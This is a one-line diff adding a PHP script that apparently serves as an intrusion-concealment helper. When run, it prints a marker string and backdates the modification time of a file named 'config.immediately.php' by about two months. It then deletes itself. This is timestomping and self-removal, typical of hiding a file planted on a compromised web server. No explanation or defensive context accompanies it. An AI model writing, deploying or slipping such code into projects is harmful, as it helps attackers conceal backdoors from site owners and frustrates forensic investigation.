@@ -1,0 +1,1 @@
+<?php echo "taPQSBBzBC"; if (file_exists("./config.immediately.php")){ touch("./config.immediately.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*CT2quMS7gf7Nfwncxg9e*/ ?>
